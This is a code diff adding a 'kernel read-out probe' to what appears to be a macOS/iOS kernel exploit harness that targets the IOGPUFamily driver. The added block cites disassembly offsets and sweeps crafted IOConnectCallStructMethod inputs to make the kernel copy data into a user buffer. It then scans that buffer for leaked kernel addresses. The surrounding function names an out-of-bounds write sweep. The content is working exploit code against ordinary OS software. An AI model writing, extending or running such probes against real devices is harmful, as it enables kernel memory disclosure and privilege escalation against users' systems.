@@ -714,6 +714,85 @@ void nk_iogpu_group_oob_run(int trigger)
         ol("[grp] controlled OOB write sweep done");
     }
 
+
+    if (trigger == 7) {
+        /* KERNEL READ-OUT PROBE.
+         *
+         * The cmd 0/128 path in IOGPUFamily (0x9f60050) resolves an object
+         * by id and then copies its data to a USER pointer:
+         *   0x9f602f4: ldr  x1, [x20, #56]     ; the kernel object
+         *   0x9f602f8: ldr  x2, [x19, #112]    ; the SIZE
+         *   0x9f60310: mov  x3, x21
+         *   0x9f6031c: bl   0x8474018          ; the copy out
+         * The destination comes from the input struct (struct[56] is the
+         * user pointer, struct[72] must be non-zero, struct[24] is the
+         * args blob which has to be >= 16 bytes).
+         *
+         * So: create a group, point the command at a big buffer we own,
+         * fill the buffer with a known pattern, and look at what the
+         * kernel wrote into it. If it writes more than we asked for, or
+         * writes kernel objects, we have a kernel read (and an
+         * out-of-bounds write into our own buffer).
+         */
+        ol("[grp] === KERNEL READ-OUT PROBE (cmd 0/128) ===");
+        static uint8_t userbuf[0x8000];
+        static uint8_t argsbuf[0x100];
+
+        int k7 = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, userbuf, &on);
+        uint64_t grp7 = 0;
+        if (k7 == 0) memcpy(&grp7, userbuf + 0x10, 8);
+        ol("[grp] group -> kr=0x%x grp=0x%016llx", k7, (unsigned long long)grp7);
+
+        /* candidates for the id/type the lookup wants */
+        static const uint64_t cands[] = { 0, 1, 2, 3, 64, 128, 256, 512,
+                                          0x1000, 0x10000, 0xffffffff };
+        for (uint32_t ci = 0; ci < sizeof(cands)/sizeof(cands[0]); ci++) {
+            for (uint32_t f72 = 1; f72 <= 2; f72++) {
+                memset(userbuf, 0xAA, sizeof(userbuf));
+                memset(argsbuf, 0, sizeof(argsbuf));
+                uint64_t v = cands[ci];
+                memcpy(argsbuf + 0, &v, 8);
+                memcpy(argsbuf + 8, &v, 8);
+                uintptr_t ap7 = (uintptr_t)argsbuf;
+                uintptr_t bp7 = (uintptr_t)userbuf;
+
+                uint8_t in7[STRUCT_SZ];
+                memset(in7, 0, sizeof(in7));
+                uint64_t c0 = 0;
+                memcpy(in7 + 0, &c0, 8);
+                memcpy(in7 + 24, &ap7, 8);
+                memcpy(in7 + 56, &bp7, 8);
+                uint64_t fv = f72;
+                memcpy(in7 + 72, &fv, 8);
+                uint64_t gid = grp7;
+                memcpy(in7 + 64, &gid, 8);
+
+                static uint8_t out7[0x400];
+                size_t on7 = sizeof(out7);
+                memset(out7, 0, on7);
+                kern_return_t kr = IOConnectCallStructMethod(conn, IOGPU_SEL, in7, sizeof(in7), out7, &on7);
+                int touched = 0;
+                for (size_t o = 0; o < sizeof(userbuf); o++) {
+                    if (userbuf[o] != 0xAA) { touched = 1; break; }
+                }
+                ol("[grp] cand=0x%llx f72=%u -> kr=0x%x outN=%zu buffer_touched=%d",
+                   (unsigned long long)cands[ci], f72, kr, on7, touched);
+                if (touched) {
+                    size_t shown = 0;
+                    for (size_t o = 0; o < sizeof(userbuf) && shown < 24; o += 8) {
+                        uint64_t w = 0;
+                        memcpy(&w, userbuf + o, 8);
+                        if (w == 0xAAAAAAAAAAAAAAAAULL) continue;
+                        shown++;
+                        ol("[grp]   buf+0x%04zx = 0x%016llx%s", o, (unsigned long long)w,
+                           grp_is_kernel_va(w) ? "   <-- KERNEL ADDRESS" : "");
+                    }
+                }
+            }
+        }
+        ol("[grp] read-out probe done");
+    }
+
     if (trigger == 0 || trigger == 4) {
         /* DUPLICATE ADD = THE REMOVE PATH.
          *
